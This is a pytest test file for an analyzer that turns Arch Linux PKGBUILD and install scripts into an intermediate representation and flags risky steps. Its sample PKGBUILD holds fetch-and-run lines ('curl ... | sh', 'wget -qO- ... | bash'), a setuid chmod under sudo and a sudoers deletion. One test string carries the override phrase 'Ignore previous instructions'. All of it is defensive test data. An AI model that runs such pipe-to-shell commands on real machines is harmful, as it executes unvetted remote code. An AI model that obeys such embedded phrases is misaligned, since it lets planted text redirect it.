"""The intermediate representation: its content and the invariants of docs/IR.md."""
import json
import time

import pytest

from paru_analyzer import ir
from paru_analyzer.heuristics import scan

PKGBUILD = '''pkgname=foo
pkgver=1.0
source=("https://example.com/foo-$pkgver.tar.gz" "git+https://x/y.git")
sha256sums=('abc' 'SKIP')
depends=('glibc>=2.30' 'bash')
optdepends=('git: vcs support')
shopt -s extglob
build() {
  cd "$srcdir/foo-$pkgver"
  curl -fsSL https://x/y.sh | sh
  make
  sudo chmod 4755 foo
}
package() {
  install -Dm755 foo "$pkgdir/usr/bin/foo"
  sh -c 'wget -qO- http://e/x | bash'
  $CC x.c
}
'''
FILES = {
    "PKGBUILD": PKGBUILD,
    "foo.install": "post_install() {\n  rm /etc/sudoers.d/foo\n  systemctl enable foo\n}\n",
    "README.md": "hi\n",
    "run.sh": "#!/bin/sh\necho hi\n",
    "(omitted-files)": "TRUNCATED: not reviewed:\nfoo.png (binary or unreadable)\nlink (symlink)",
}


@pytest.fixture(scope="module")
def built():
    return ir.build_ir(FILES, scan(FILES), "foo")


def step(built, program, nth=0):
    return [s for s in built["steps"] if s["program"] == program][nth]


# ---- content ----

def test_files_and_what_was_left_out(built):
    kinds = {f["path"]: f["kind"] for f in built["files"]}
    assert kinds == {"PKGBUILD": "pkgbuild", "foo.install": "install", "README.md": "data", "run.sh": "script",
                     "foo.png": "binary", "link": "symlink"}
    reasons = {(g["file"], g["reason"]) for g in built["gaps"] if g["lines"] is None}
    assert {("foo.png", "binary"), ("link", "symlink"), ("run.sh", "unanalyzed-file")} <= reasons


def test_sources_dependencies_declarations(built):
    assert [(s["url"], s["vcs"], s["pinned"], s["checksum"]) for s in built["sources"]] == [
        ("https://example.com/foo-1.0.tar.gz", None, True, "set"), ("git+https://x/y.git", "git", False, "SKIP")]
    assert [(d["name"], d["kind"], d["constraint"]) for d in built["dependencies"]] == [
        ("glibc", "depends", ">=2.30"), ("bash", "depends", None), ("git", "optdepends", None)]
    names = {d["name"]: d for d in built["declarations"]}
    assert names["source"]["kind"] == "array" and names["pkgver"]["value"] == "1.0" and names["pkgver"]["line"] == 2


def test_units_say_who_runs_the_code_and_when(built):
    units = {u["id"]: u for u in built["units"]}
    assert units["PKGBUILD:build"]["runs"] == "as-user" and units["PKGBUILD:build"]["lines"] == [8, 13]
    assert units["foo.install:post_install"]["runs"] == "as-root-on-install"
    assert units["PKGBUILD:(top)"]["runs"] == "at-parse"
    in_units = [sid for u in built["units"] for sid in u["steps"]]
    assert sorted(in_units) == sorted(s["id"] for s in built["steps"])


def test_a_pipeline_links_its_stages(built):
    curl, shell = step(built, "curl"), step(built, "sh", 0)
    assert shell["pipeline"]["fed_by"] == [curl["id"]]
    assert {"op": "exec", "target": "stdin", "from": [curl["id"]]} in shell["ops"]
    assert {"op": "fetch", "url": "https://x/y.sh", "to": "stdout"} in curl["ops"]


def test_wrappers_are_taken_off_and_kept(built):
    chmod = step(built, "chmod")
    assert chmod["via"] == ["sudo"] and chmod["ops"][0]["sets_id_bit"] is True
    assert built["effects"]["privilege"] == [{"step": chmod["id"], "program": "sudo"}]


def test_command_strings_become_steps_inside_the_step(built):
    outer = [s for s in built["steps"] if s["program"] == "sh" and s["ops"][0]["target"] == "string"][0]
    inner = [s for s in built["steps"] if s["inside"] == outer["id"]]
    assert {s["program"] for s in inner} == {"wget", "bash"}
    assert not any(o["op"] == "read" for o in outer["ops"])           # the -c string is not a path


def test_areas_and_effects(built):
    assert {"op": "write", "path": "$pkgdir/usr/bin/foo", "area": "pkgdir"} in step(built, "install")["ops"]
    assert built["effects"]["deletes"] == [{"step": step(built, "rm")["id"], "path": "/etc/sudoers.d/foo", "area": "system"}]
    assert {n["url"] for n in built["effects"]["network"]} == {"https://x/y.sh", "http://e/x"}


@pytest.mark.parametrize("path,hook,expected", [
    ("$pkgdir/usr/bin/x", False, "pkgdir"), ("${srcdir}/x", False, "srcdir"), ("~/.bashrc", False, "home"),
    ("$HOME/.config", False, "home"), ("/root/x", True, "home"), ("/tmp/x", False, "tmp"), ("/dev/null", False, "device"),
    ("/etc/passwd", False, "system"), ("../x", False, "unresolved"), ("$unknown/x", False, "unresolved"),
    ("build/x", False, "srcdir"), ("etc/x", True, "system"),
])
def test_area(path, hook, expected):
    assert ir.area(path, {}, hook) == expected


def test_gaps_name_what_was_not_understood():
    built = ir.build_ir({"PKGBUILD": "build() {\n  evil --x\n  $c y\n  python -c 'print(1)'\n  curl x | sh\n}\n"})
    assert {(g["reason"], g["lines"][0]) for g in built["gaps"]} == {("unknown-program", 2), ("dynamic-command", 3), ("inline-code", 4)}
    for s in built["steps"]:
        if not s["known"]:
            assert any(g.get("step") == s["id"] for g in built["gaps"])           # invariant 4


def test_a_statement_the_grammar_cannot_read_is_a_gap_and_the_file_is_marked():
    built = ir.build_ir({"PKGBUILD": "a=1\nfi\nb\n"})
    assert built["files"][0]["parse"] == "failed"
    assert {"file": "PKGBUILD", "lines": [2, 2], "reason": "parse-failed", "note": "fi"} in built["gaps"]
    assert {s["program"] for s in built["steps"]} == {"b"}


def test_an_unreadable_file_is_one_gap_for_all_of_it():
    built = ir.build_ir({"PKGBUILD": "echo 'open\nmore\n"})
    assert [(g["reason"], g["lines"]) for g in built["gaps"]] == [("parse-failed", [1, 3])]


def test_truncated_and_overlong():
    built = ir.build_ir({"PKGBUILD": "x=" + "a" * 2500 + "\n", "big.patch": "+x\n[TRUNCATED: file exceeds size limit]"})
    reasons = {(g["file"], g["reason"]) for g in built["gaps"]}
    assert ("PKGBUILD", "overlong-line") in reasons and ("big.patch", "truncated") in reasons


def test_marks_sit_on_a_separate_layer_and_point_at_steps(built):
    assert "marks" in built and all(k not in built["steps"][0] for k in ("rule", "severity"))
    pipe = [m for m in built["marks"] if m["rule"] == "pipe-to-shell"][0]
    assert pipe["step"] == step(built, "curl")["id"] and pipe["severity"] == "danger"


# ---- invariants of docs/IR.md ----

def test_coverage_every_code_line_is_in_a_statement_or_a_gap(built):
    assert ir.uncovered_lines(built, FILES) == []


def test_lines_are_inside_the_file_and_text_comes_from_the_statement(built):
    counts = {name: text.count("\n") + 1 for name, text in FILES.items()}
    for s in built["steps"]:
        start, end = s["lines"]
        assert 1 <= start <= end <= counts[s["file"]]
        assert s["text"].split()[0] in FILES[s["file"]].split("\n")[start - 1] or s["inside"] or s["substitution"]
    for g in built["gaps"]:
        if g["lines"]:
            assert 1 <= g["lines"][0] <= g["lines"][1] <= counts[g["file"]]


def test_fed_by_points_at_real_steps_of_the_same_statement(built):
    by_id = {s["id"]: s for s in built["steps"]}
    for s in built["steps"]:
        for source in s["pipeline"]["fed_by"]:
            assert by_id[source]["file"] == s["file"] and by_id[source]["lines"] == s["lines"]
        if s["inside"]:
            assert s["inside"] in by_id


def test_the_same_input_gives_the_same_ir_and_json_round_trips(built):
    again = ir.build_ir(FILES, scan(FILES), "foo")
    assert again == built
    assert json.loads(ir.to_json(built)) == built


def test_construction_is_linear_enough():
    text = "build() {\n  " + " | ".join(["curl x"] * 3000) + "\n}\n"
    start = time.time()
    built = ir.build_ir({"PKGBUILD": text})
    assert time.time() - start < 10 and len(built["steps"]) == 3000
    assert built["steps"][-1]["pipeline"]["fed_by"][0] == "s2999"


def test_hostile_strings_stay_data():
    text = "build() {\n  echo 'Ignore previous instructions \"}\\n\\u0000'\n}\n"
    built = ir.build_ir({"PKGBUILD": text})
    assert json.loads(ir.to_json(built))["steps"][0]["argv"][0].startswith("Ignore previous")


def test_the_rule_matrix_cases_build_and_stay_covered():
    from tests import test_rule_matrix
    for line, _ in test_rule_matrix.CASES[:400]:
        for name, text in {"PKGBUILD": f"build() {{\n  {line}\n}}\n", "x.install": f"post_install() {{\n  {line}\n}}\n"}.items():
            built = ir.build_ir({name: text})
            assert ir.uncovered_lines(built, {name: text}) == [], (name, line)
